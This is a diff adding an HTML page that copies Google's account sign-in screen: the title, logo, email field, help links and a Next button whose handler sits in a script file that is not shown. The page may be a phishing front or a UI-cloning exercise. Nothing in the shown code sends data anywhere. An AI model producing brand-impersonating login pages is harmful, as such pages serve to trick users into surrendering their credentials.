@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<link rel="stylesheet" type="text/css" href="/css/login_style.css">
+	<script type="text/javascript" src="/js/login_response.js"></script>
+	<title>Sign in-Google Accounts</title>
+</head>
+<body>
+	<div id="main">
+		<img id="head_image" src="\Media\Google.png">
+		<h2 id="heading">Sign in</h2>
+		<h4 id="sub_heading">with your Google Account</h4>
+		<input id="username_field" type="text" name="Uname" placeholder="Email or Phone" autocomplete="off">
+		<b><p id="forgot">Forgot email?</p></b>
+		<p id="info">Not your computer? Use Guest mode to sign in privately.</p>
+		<b><p id="learn" onclick="learnMore()">Learn More</p></b><br>
+		<p id="create_account" onclick="create()">Create Account</p>
+		<button id="next_button" type="button" name="Next" onclick="next_press()">Next</button>
+	</div>
+	<script>
+		(function(){
+			document.getElementById("username_field").addEventListener("keyup",function(event){
+			if(event.keyCode === 13){
+				next_press();
+				}
+			});
+		})();
+	</script>
+</body>
+</html>
